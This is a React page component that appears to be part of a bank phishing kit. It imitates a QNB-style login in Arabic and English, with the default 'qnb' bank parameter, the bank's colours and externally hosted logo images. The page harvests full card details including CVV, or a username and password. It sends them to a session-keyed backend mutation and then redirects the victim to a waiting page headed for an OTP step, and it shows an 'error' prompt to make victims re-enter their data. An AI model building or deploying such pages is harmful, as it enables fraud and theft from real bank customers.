import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function LoginMethod() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language, setLanguage } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const hasError = params.get("error") === "true";
  
  const [sessionId, setSessionId] = useState<string>("");

  useEffect(() => {
    const sId = localStorage.getItem("sessionId") || params.get("session") || "";
    if (sId) {
      setSessionId(sId);
      if (!localStorage.getItem("sessionId")) {
        localStorage.setItem("sessionId", sId);
      }
    }
  }, [params]);

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  const [method, setMethod] = useState<"card" | "user">("card");
  const [cardData, setCardData] = useState({
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
  });
  const [userData, setUserData] = useState({
    username: "",
    password: "",
  });

  const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    // إضافة التنسيق التلقائي لحقل تاريخ انتهاء البطاقة
    if (name === "expiryDate") {
      // إزالة أي أحرف غير رقمية
      let cleanedValue = value.replace(/\D/g, "");
      
      // تحديد الحد الأقصى للأرقام (4 أرقام: شهر وسنة)
      if (cleanedValue.length > 4) {
        cleanedValue = cleanedValue.slice(0, 4);
      }
      
      // إضافة الفاصل بعد الرقمين الأولين (الشهر)
      if (cleanedValue.length > 2) {
        cleanedValue = cleanedValue.slice(0, 2) + "/" + cleanedValue.slice(2);
      }
      
      setCardData((prev) => ({ ...prev, [name]: cleanedValue }));
    } else {
      setCardData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleUserChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setUserData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const currentSessionId = sessionId || localStorage.getItem("sessionId") || params.get("session") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة، يرجى العودة للرئيسية" : "Invalid session, please return to home");
      return;
    }

    try {
      if (method === "card") {
        if (!cardData.cardNumber || !cardData.cardholderName || !cardData.expiryDate || !cardData.cvv) {
          toast.error(isArabic ? "يرجى ملء كافة بيانات البطاقة" : "Please fill all card details");
          return;
        }

        await submitLoginMethodMutation.mutateAsync({
          sessionId: currentSessionId,
          loginType: "card",
          cardNumber: cardData.cardNumber,
          cardholderName: cardData.cardholderName,
          expiryDate: cardData.expiryDate,
          cvv: cardData.cvv,
          username: "",
          password: "",
        });
      } else {
        if (!userData.username || !userData.password) {
          toast.error(isArabic ? "يرجى ملء اسم المستخدم وكلمة المرور" : "Please fill username and password");
          return;
        }

        await submitLoginMethodMutation.mutateAsync({
          sessionId: currentSessionId,
          loginType: "user",
          username: userData.username,
          password: userData.password,
          cardNumber: "",
          cardholderName: "",
          expiryDate: "",
          cvv: "",
        });
      }
      
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp`);
    } catch (error) {
      console.error("Submission error:", error);
      toast.error(isArabic ? "فشل الإرسال، يرجى المحاولة مرة أخرى" : "Submission failed, please try again");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  return (
    <div className="page-wrapper">
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .container { padding: 20px; flex: 1; }
        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }
        .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; text-align: center; transition: 0.3s; }
        .selection-box.active { border-color: #8C0032; background-color: #fff9f9; }
        .selection-box h3 { margin: 0 0 10px 0; color: #333; }
        .selection-box p { margin: 0; color: #8C0032; font-weight: bold; }
        .form-section { background: white; padding: 20px; border-radius: 10px; display: none; margin-top: 15px; }
        .form-section.active { display: block; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>
      
      <header className="header">
        <div style={{ fontSize: "28px", color: "#8C0032" }}>&#9776;</div>
        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663821954062/BkVFgBrnkZHoPjjv.png" className="logo" alt="Logo" />
        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
      </header>

      <div className="container">
        {hasError && (
          <div className="error-message">
            {isArabic ? "رجاء التأكد من المعلومات الصحيحة وإعادة المحاولة" : "Please ensure correct information and try again"}
          </div>
        )}

        <div className={`selection-box ${method === "card" ? "active" : ""}`} onClick={() => setMethod("card")}>
          <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
          <p>{isArabic ? "البطاقة البنكية" : "Bank Card"}</p>
        </div>

        <div className={`selection-box ${method === "user" ? "active" : ""}`} onClick={() => setMethod("user")}>
          <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
          <p>{isArabic ? "باسم المستخدم وكلمة المرور" : "Username & Password"}</p>
        </div>

        <form onSubmit={handleSubmit}>
          {method === "card" ? (
            <div className="form-section active">
              <div className="form-group">
                <label>{isArabic ? "رقم البطاقة" : "Card Number"}</label>
                <input name="cardNumber" type="number" placeholder="XXXX XXXX XXXX XXXX" value={cardData.cardNumber} onChange={handleCardChange} />
              </div>
              <div className="form-group">
                <label>{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
                <input name="cardholderName" type="text" placeholder={isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"} value={cardData.cardholderName} onChange={handleCardChange} />
              </div>
              <div style={{ display: "flex", gap: "10px" }}>
                <div className="form-group" style={{ flex: 1 }}>
                  <label>{isArabic ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                  <input name="expiryDate" type="text" placeholder="MM/YY" value={cardData.expiryDate} onChange={handleCardChange} />
                </div>
                <div className="form-group" style={{ flex: 1 }}>
                  <label>CVV</label>
                  <input name="cvv" type="number" placeholder="XXX" value={cardData.cvv} onChange={handleCardChange} />
                </div>
              </div>
            </div>
          ) : (
            <div className="form-section active">
              <div className="form-group">
                <label>{isArabic ? "اسم المستخدم" : "Username"}</label>
                <input name="username" type="text" placeholder={isArabic ? "اسم المستخدم" : "Username"} value={userData.username} onChange={handleUserChange} />
              </div>
              <div className="form-group">
                <label>{isArabic ? "كلمة المرور" : "Password"}</label>
                <input name="password" type="password" placeholder={isArabic ? "كلمة المرور" : "Password"} value={userData.password} onChange={handleUserChange} />
              </div>
            </div>
          )}
          <button type="submit" className="submit-btn" disabled={submitLoginMethodMutation.isLoading}>
            {submitLoginMethodMutation.isLoading ? (isArabic ? "جاري الإرسال..." : "Sending...") : (isArabic ? "متابعة" : "Continue")}
          </button>
        </form>
      </div>

      <img src={footerImage} className="footer-image" alt="Footer" />
    </div>
  );
}
